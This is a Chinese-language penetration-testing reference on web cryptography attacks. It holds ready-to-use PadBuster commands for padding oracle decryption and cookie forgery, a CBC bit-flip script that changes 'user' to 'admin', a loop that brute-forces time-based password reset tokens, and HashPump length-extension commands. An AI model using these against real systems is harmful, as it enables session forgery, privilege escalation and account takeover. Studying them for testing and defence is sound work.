# Web 密码学攻击详细技术

## Padding Oracle Attack 详解

### 利用工具

**PadBuster（经典）**：
```bash
padbuster http://target/api?token=ENCRYPTED_TOKEN ENCRYPTED_TOKEN 16 -encoding 0
```
参数：16 是 block size（AES=16, DES=8），`-encoding 0` 是原始 hex。

**Python 脚本（更灵活）**：
核心逻辑：逐字节测试 padding，通过响应差异判断 padding 是否正确。从最后一个 block 开始，逐步恢复每个 block 的明文，然后通过类似过程伪造任意明文。

### 常见场景
- ASP.NET Padding Oracle (CVE-2010-3332)
- 自定义加密的 Cookie（`role=user` → 解密后修改为 `role=admin`）

### Cookie 场景（如 captcha/session cookie）

当 Padding Oracle 漏洞在 Cookie 中时（如 `captcha=BASE64_CIPHER`）：

```bash
# 1. 先确认 oracle：修改密文不同字节，观察 200 vs 500 响应差异
# 2. 使用 padbuster 解密 cookie（-cookies 指定要发送的 cookie）
padbuster http://TARGET/ BASE64_CIPHER 16 -cookies "captcha=BASE64_CIPHER" -encoding 0

# 3. 加密自定义值（如绕过 captcha 验证）
padbuster http://TARGET/ BASE64_CIPHER 16 -cookies "captcha=BASE64_CIPHER" -encoding 0 -plaintext "YOUR_VALUE"
```

⚠️ **重要**：padbuster 需要 Perl 环境（大多数渗透测试系统已预装）。
如果 padbuster 不可用，再使用 Python 手写实现（但注意 oracle 条件：200=valid padding, 500=invalid padding）。

## CBC Bit-Flip Attack 详解

### XOR 翻转原理
CBC 模式中，修改第 N 个密文 block 的某个字节：
- 破坏第 N 个明文 block（变成垃圾）
- **精确翻转**第 N+1 个明文 block 对应字节

### 利用脚本
```python
import base64

# user -> admin: 计算 XOR 差值翻转对应字节
cipher = bytearray(base64.b64decode(token))
cipher[offset] ^= ord('u') ^ ord('a')      # u -> a
cipher[offset+1] ^= ord('s') ^ ord('d')    # s -> d
cipher[offset+2] ^= ord('e') ^ ord('m')    # e -> m
cipher[offset+3] ^= ord('r') ^ ord('i')    # r -> i
# 第 5 个字节：空 -> n，需要知道原始 padding 情况
new_token = base64.b64encode(cipher).decode()
```

## 弱随机数 / 可预测 Token

### 识别
- 密码重置 Token 基于时间戳（`md5(timestamp + email)`）
- Session ID 递增或基于可预测种子
- CSRF Token 基于用户 ID 的简单哈希

### 利用
```python
import hashlib, time

target_email = "admin@target.com"
# 在请求重置的时间附近暴力枚举
for ts in range(int(time.time()) - 10, int(time.time()) + 10):
    token = hashlib.md5(f"{ts}{target_email}".encode()).hexdigest()
    # 尝试使用 token 重置密码
```

## 哈希长度扩展攻击

### 适用条件
- 服务端使用 `H(secret + message)` 作为签名（MD5/SHA1/SHA256）
- 你知道 `message` 和 `H(secret + message)` 的值
- 你不知道 `secret`

### 使用 HashPump
```bash
hashpump -s ORIGINAL_HASH -d 'original_data' -a '&admin=true' -k SECRET_LENGTH
```
SECRET_LENGTH 需要暴力枚举（通常 8-32）。

### 不适用的情况
- HMAC 不受此攻击影响
- SHA-3/BLAKE2 等新算法不受此攻击影响
